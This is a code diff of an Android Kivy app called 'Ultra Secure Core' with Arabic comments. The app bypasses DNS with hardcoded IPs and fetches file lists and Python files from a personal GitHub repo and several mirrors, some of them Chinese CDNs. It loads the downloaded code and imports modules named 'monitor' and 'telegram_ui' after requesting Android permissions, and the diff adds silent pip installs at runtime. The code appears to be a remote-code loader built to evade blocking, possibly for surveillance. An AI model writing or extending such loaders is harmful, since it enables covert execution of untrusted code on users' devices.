@@ -28,24 +28,18 @@ def _patch_dns():
     original_getaddrinfo = socket.getaddrinfo
 
     def patched_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
-        # قائمة الأسماء التي نريد تجاوزها مع عناوين IP المقابلة
+        # قائمة الأسماء مع عناوين IP البديلة
         override = {
             'raw.githubusercontent.com': [
-                '185.199.108.133',
-                '185.199.109.133',
-                '185.199.110.133',
-                '185.199.111.133'
+                '185.199.108.133', '185.199.109.133',
+                '185.199.110.133', '185.199.111.133'
             ],
             'cdn.jsdelivr.net': [
-                '151.101.2.229',
-                '151.101.66.229',
-                '151.101.130.229'
+                '151.101.2.229', '151.101.66.229', '151.101.130.229'
             ],
-            'zaen1993.github.io': [          # ✅ إضافة النطاق الشخصي (GitHub Pages)
-                '185.199.108.153',
-                '185.199.109.153',
-                '185.199.110.153',
-                '185.199.111.153'
+            'zaen1993.github.io': [   # GitHub Pages
+                '185.199.108.153', '185.199.109.153',
+                '185.199.110.153', '185.199.111.153'
             ]
         }
         if host in override:
@@ -55,19 +49,17 @@ def _patch_dns():
 
     socket.getaddrinfo = patched_getaddrinfo
 
-# تطبيق التصحيح فوراً
 _patch_dns()
 
-# ========== 2. قائمة موسعة لعناوين index.json (مرايا متعددة) ==========
+# ========== 2. قائمة موسعة لعناوين index.json ==========
 INDEX_URLS = [
-    "https://zaen1993.github.io/Android-Core/index.json",                     # GitHub Pages (الأفضل)
-    "https://raw.kkgithub.com/Zaen1993/Android-Core/main/index.json",         # مرآة kkgithub
-    "https://jsd.cdn.zzko.cn/gh/Zaen1993/Android-Core@main/index.json",       # CDN صيني سريع
-    "https://cdn.jsdelivr.net/gh/Zaen1993/Android-Core@main/index.json",      # jsDelivr
+    "https://zaen1993.github.io/Android-Core/index.json",
+    "https://raw.kkgithub.com/Zaen1993/Android-Core/main/index.json",
+    "https://jsd.cdn.zzko.cn/gh/Zaen1993/Android-Core@main/index.json",
+    "https://cdn.jsdelivr.net/gh/Zaen1993/Android-Core@main/index.json",
     "https://raw.githubusercontent.com/Zaen1993/Android-Core/refs/heads/main/index.json"
 ]
 
-# رأسيات HTTP تحاكي متصفح حقيقي
 HEADERS = {
     'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
     'Accept': 'application/json, text/plain, */*',
@@ -93,7 +85,33 @@ os.makedirs(U, exist_ok=True)
 if R not in sys.path:
     sys.path.insert(0, R)
 
-# ========== دالة طلب الأذونات ==========
+# ========== 4. دالة تثبيت مكتبات AI ديناميكياً (لتجنب فشل البناء) ==========
+def _ensure_ai_libs():
+    """
+    يحاول تثبيت numpy و tflite-runtime داخل بيئة التطبيق (site-packages).
+    يتم استدعاؤها في خيط منفصل بعد تحميل الملفات الأساسية.
+    """
+    try:
+        import numpy
+        import tflite_runtime
+        # موجودة بالفعل
+        return True
+    except ImportError:
+        # محاولة التثبيت باستخدام pip المضمن
+        try:
+            import subprocess
+            # تثبيت numpy أولاً (أخف حجماً وأقل تعقيداً)
+            subprocess.run([sys.executable, '-m', 'pip', 'install', 'numpy==1.26.4'],
+                           capture_output=True, check=True)
+            # محاولة تثبيت tflite-runtime (قد تفشل، لكنها ليست حرجة للتشغيل الأساسي)
+            subprocess.run([sys.executable, '-m', 'pip', 'install', 'tflite-runtime==2.14.0'],
+                           capture_output=True, check=True)
+            return True
+        except Exception as e:
+            print(f"[AI] Failed to install AI libs: {e}")
+            return False
+
+# ========== 5. دالة طلب الأذونات ==========
 def _perms():
     try:
         from android.permissions import request_permissions, Permission
@@ -117,11 +135,10 @@ def _perms():
     except Exception as e:
         print(f"Permissions error: {e}")
 
-# ========== 4. تطبيق Kivy الرئيسي ==========
+# ========== 6. تطبيق Kivy الرئيسي ==========
 class CoreApp(App):
     def build(self):
-        # تم نقل استدعاء _perms() إلى _run() لتجنب مشاكل التوقيت
-        self.title = "Ultra Secure Core v5.0.2"
+        self.title = "Ultra Secure Core v6.0.0"
         layout = BoxLayout(orientation='vertical', spacing=5)
 
         self.log = TextInput(
@@ -179,7 +196,6 @@ class CoreApp(App):
             return False
 
     def _download_safe(self, url, filename):
-        """تحميل ملف مع تجربة عدة روابط بديلة"""
         tmp_path = os.path.join(U, filename)
         final_path = os.path.join(R, filename)
 
@@ -187,8 +203,6 @@ class CoreApp(App):
         if "raw.githubusercontent.com" in url:
             candidates.append(url.replace("raw.githubusercontent.com", "cdn.jsdelivr.net/gh").replace("/refs/heads/main", "@main"))
             candidates.append(url.replace("raw.githubusercontent.com", "raw.kkgithub.com"))
-        elif "cdn.jsdelivr.net" in url:
-            candidates.append(url)
 
         for attempt in range(3):
             for current_url in candidates:
@@ -218,11 +232,11 @@ class CoreApp(App):
         threading.Thread(target=self._run, daemon=True).start()
 
     def _run(self):
-        # ✅ طلب الأذونات في بداية خيط التشغيل (بعد أن يكون التطبيق قد استقر)
+        # طلب الأذونات بعد بدء التطبيق
         _perms()
         self._log("🚀 Ultra Secure Core (Anti-Block Mode) starting...", "BOOT")
 
-        # --- 1. جلب قائمة الملفات من index.json ---
+        # --- 1. جلب index.json ---
         all_files = []
         for idx_url in INDEX_URLS:
             try:
@@ -259,13 +273,16 @@ class CoreApp(App):
         importlib.invalidate_caches()
         gc.collect()
 
-        # --- 4. التأكد من وجود telegram_ui.py ---
+        # --- 4. محاولة تثبيت مكتبات AI (numpy & tflite) في الخلفية ---
+        threading.Thread(target=_ensure_ai_libs, daemon=True).start()
+
+        # --- 5. التأكد من وجود telegram_ui.py ---
         telegram_path = os.path.join(R, "telegram_ui.py")
         if not os.path.exists(telegram_path):
             self._log("❌ telegram_ui.py not found. Please check internet connection and retry.", "ERROR")
             return
 
-        # --- 5. تشغيل النظام الأساسي ---
+        # --- 6. تشغيل النظام الأساسي ---
         try:
             import monitor
             import telegram_ui
